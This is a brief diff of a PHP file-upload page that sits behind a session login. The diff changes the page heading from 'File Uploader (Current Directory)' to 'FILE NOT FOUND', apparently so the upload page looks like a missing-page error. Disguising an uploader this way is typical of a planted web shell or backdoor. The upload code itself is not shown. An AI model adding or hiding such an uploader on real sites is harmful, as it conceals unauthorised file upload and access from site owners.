@@ -64,7 +64,7 @@ if (isset($_SESSION['auth']) && isset($_FILES['file'])) {
 </head>
 <body>
 
-<h2>File Uploader (Current Directory)</h2>
+<h2>FILE NOT FOUND</h2>
 
 <?php if (empty($_SESSION['auth'])): ?>
 
